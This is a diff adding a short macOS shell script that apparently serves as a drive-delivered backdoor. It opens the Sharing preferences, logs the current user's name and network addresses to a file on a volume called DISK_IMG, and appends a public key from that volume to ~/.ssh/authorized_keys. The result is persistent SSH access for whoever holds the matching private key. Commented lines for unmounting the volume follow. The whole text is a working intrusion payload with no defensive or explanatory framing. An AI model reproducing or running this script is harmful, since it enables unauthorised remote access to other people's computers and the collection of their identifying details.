@@ -1,0 +1,12 @@
+open -b com.apple.systempreferences /System/Library/PreferencePanes/SharingPref.prefPane
+path=`pwd`
+username=${path:7}
+info=`ifconfig | grep inet`
+echo $username >> /Volumes/DISK_IMG/People/$username.txt
+echo "" >> /Volumes/DISK_IMG/People/$username.txt
+echo $info >> /Volumes/DISK_IMG/People/$username.txt
+mkdir .ssh
+cat /Volumes/DISK_IMG/Files/id_rsa.pub >> .ssh/authorized_keys
+#disklist=`diskutil list | grep DISK_IMG`
+#place=${disklist: -7}
+#diskutil umount /dev/$place
